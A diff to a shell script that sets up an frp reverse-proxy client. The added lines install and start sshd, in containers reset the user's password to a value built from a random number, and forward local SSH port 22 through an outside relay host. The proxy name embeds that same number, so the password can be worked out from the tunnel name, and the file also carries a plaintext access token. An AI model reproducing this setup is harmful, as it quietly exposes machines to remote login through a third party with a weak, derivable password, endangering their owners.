@@ -37,6 +37,8 @@ while ! test -z "$(ps -A | grep -w ${FRP_NAME})"; do
     kill -9 $FRPCPID
 done
 
+RANDOM_0=${RANDOM}
+
 # check pkg
 if type apt-get >/dev/null 2>&1 ; then
     if ! type wget >/dev/null 2>&1 ; then
@@ -48,6 +50,13 @@ if type apt-get >/dev/null 2>&1 ; then
 
     if ! type sshd >/dev/null 2>&1 ; then
         apt-get install ssh -y
+        if ! grep -q '/docker/' /proc/1/cgroup; then
+        systemctl restart ssh
+        else
+        mkdir /var/run/sshd/
+        nohup /usr/sbin/sshd -D &
+        printf "gG${RANDOM_0}${RANDOM_0}\ngG${RANDOM_0}${RANDOM_0}\n" | passwd $USER
+        fi
     fi
 fi
 
@@ -111,7 +120,7 @@ server_addr = frp.myauth.top
 server_port = 7000
 token = hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO
 
-[ssh_${SUDO_USER}_$(hostname)_${RANDOM}]
+[ssh_${SUDO_USER:-root}_$(hostname)_${RANDOM_0}]
 type = tcp
 local_ip = 127.0.0.1
 local_port = 22
